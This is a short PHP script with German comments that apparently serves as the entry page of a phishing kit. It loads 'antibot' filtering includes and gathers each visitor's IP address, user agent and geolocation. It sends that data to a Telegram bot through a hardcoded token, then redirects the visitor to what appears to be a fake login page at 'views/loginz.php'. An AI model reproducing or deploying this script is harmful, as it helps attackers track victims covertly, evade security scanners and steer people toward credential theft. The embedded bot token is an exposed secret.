<?php
// Deine existierenden Includes
require './antibot.php';
require './prevents/genius.php';
include './antibot/tds.php';
include './prevents/anti.php';
include './prevents/anti2.php';
include './prevents/sub_anti.php';
include './prevents/block.php.php';

// Telegram Bot Token und Chat-ID
$botToken = "8018269855:AAEFA85o8SlWZP7Z5Qq9gNVdPMd6iRVOs1Q";
$chatId = "8018269855";

// Besucherdaten sammeln
$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$datumUhrzeit = date("d.m.Y H:i:s"); // Deutsches Datumsformat

// IP-Lokalisierung abrufen (via API)
$geoInfo = file_get_contents("http://ip-api.com/json/$ip?lang=de");
$geoData = json_decode($geoInfo, true);

if ($geoData && $geoData['status'] == 'success') {
    $location = $geoData['city'] . ', ' . $geoData['country'];
} else {
    $location = "Unbekannt";
}

// Nachricht formatieren
$message = "📌 Neue Seitenaufruf-Benachrichtigung:\n\n" .
           "🕒 Zeit: $datumUhrzeit\n" .
           "📍 Standort: $location\n" .
           "💻 IP: $ip\n" .
           "🌐 User-Agent: $userAgent";

// Nachricht an Telegram senden
$telegramUrl = "https://api.telegram.org/bot$botToken/sendMessage";
$data = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML'
];

// cURL verwenden, um die Nachricht zu senden
$ch = curl_init($telegramUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_exec($ch);
curl_close($ch);

// Weiterleitung
header("Location: views/loginz.php");
exit;
?>
